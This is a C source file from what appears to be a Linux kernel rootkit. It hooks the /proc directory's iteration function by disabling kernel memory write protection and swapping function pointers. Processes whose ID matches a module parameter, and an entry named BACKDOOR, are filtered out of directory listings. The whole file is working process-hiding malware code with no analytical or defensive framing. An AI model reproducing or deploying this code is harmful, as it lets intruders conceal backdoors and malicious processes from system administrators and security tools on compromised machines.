#include "../header/hide.h"


long secret_proc = INT_MAX;

module_param(secret_proc, long, S_IRUSR);
MODULE_PARM_DESC(secret_proc, "the secret process number.");


int (*real_proc_iterate)(struct file *filp, struct dir_context *ctx);

int fake_proc_iterate(struct file *filp, struct dir_context *ctx);

int (*real_proc_filldir)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);

int fake_proc_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);

void hook_proc_iterate(void) {                       
    struct file *filp;                                  
    struct file_operations *f_op;                       
                                                        
    printk(KERN_INFO "Opening the path: %s.\n", PROC_HIDE_PATH);          
    filp = filp_open(PROC_HIDE_PATH, O_RDONLY, 0);                
                            

    f_op = (struct file_operations *)filp->f_op;    
    real_proc_iterate = f_op->iterate_shared;                              
                                                    
    unprotect_memory();                     
    f_op->iterate_shared = fake_proc_iterate;               
    protect_memory();                      
                                
}

void hook_proc_cleanup(void) {
    struct file *filp;                                  
    struct file_operations *f_op;                       
                                                        
    printk(KERN_INFO "Opening the path: %s.\n", PROC_HIDE_PATH);          
    filp = filp_open(PROC_HIDE_PATH, O_RDONLY, 0);                
                            
    f_op = (struct file_operations *)filp->f_op;    
                            
    unprotect_memory();                     
    f_op->iterate_shared = real_proc_iterate;               
    protect_memory();            
}

int fake_proc_iterate(struct file *filp, struct dir_context *ctx) {
    real_proc_filldir = ctx->actor;
    *(filldir_t *)&ctx->actor = fake_proc_filldir;

    return real_proc_iterate(filp, ctx);
}


int fake_proc_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type) {
    
    long pid;
    kstrtol(name, 10, &pid);
    if (pid == secret_proc) {
        printk(KERN_INFO "Hiding process: %s\n", name);
        return 0;
    } else if (strcmp(name, BACKDOOR) == 0) {
    	printk(KERN_INFO "Hiding backdoor: %s\n", name);
        return 0;
    }

    return real_proc_filldir(ctx, name, namlen, offset, ino, d_type);
}


void proc_hide(void) {
	hook_proc_iterate();
}

void proc_unhide(void) {
	hook_proc_cleanup();
}
